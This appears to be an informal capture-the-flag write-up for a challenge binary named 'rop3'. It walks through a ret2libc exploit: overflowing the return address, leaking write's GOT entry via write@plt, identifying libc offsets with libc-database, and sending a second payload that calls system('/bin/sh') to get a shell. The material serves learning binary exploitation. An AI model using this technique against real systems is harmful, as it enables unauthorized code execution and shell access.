### The importtant is leak the address of system /bin/sh

so now !!
we need overflow the retn
	
padding = 140 character

return -> write_plt

function write is write something to command line 
ok so we have ( printf and puts and write to do that )

in this challenge we have write_plt

1 - > find the address of write_plt
the write have something like that write( 1 , address , 4 )

after we find the write_plt we must know the write_got or something in got tables

we can use 
```
objdump -R rop3 
```
to know the got  function like 

At here , i use write_got

2-> find the address of write_got

3-> building payload
payload look like
```
padding + write_plt + retn_after + one + write_got + four

```
ok !! i will explain ....
we redirect to write_plt then we need 4 byte address return after w
rite_plt excute !
then we need by pass the write(1 ,need_to_print,4)
that mean we write 4 byte of need_to_print 
so we have write(1,write_got,4) -> so we have write_got address

4-> use write_got address to find system and binsh

we use libc-database

```
./find write 0xf7685fe0
ubuntu-trusty-i386-libc6 (id libc6_2.19-0ubuntu6.9_i386)

 ./dump libc6_2.19-0ubuntu6.9_i
386
offset___libc_start_main_ret = 0x19af3
offset_system = 0x00040310
offset_dup2 = 0x000db920
offset_read = 0x000daf60
offset_atoi = 0x000318e0
offset_printf = 0x0004d410
offset_puts = 0x000657e0
offset_write = 0x000dafe0
offset_str_bin_sh = 0x16084c

```
ok so now we have offset_write = 0x000dafe0
from that we can know the address bin_sh and system 
with its offset  

4-> offset_write = 0x000dafe0
    offset_system=0x00040310
    offset_bin_sh=0x16084c

so know we can figure out the base address
with 
address_write - offset_write = base
system_address = base+ offset_system
binsh= base + offset_bin_sh

5->we need to redirect the code after write address_write after excute to vuln again 

so now we send the payload again like that:

payload = padding +system_address + "junk" + binsh

we control the shell

now we 
	
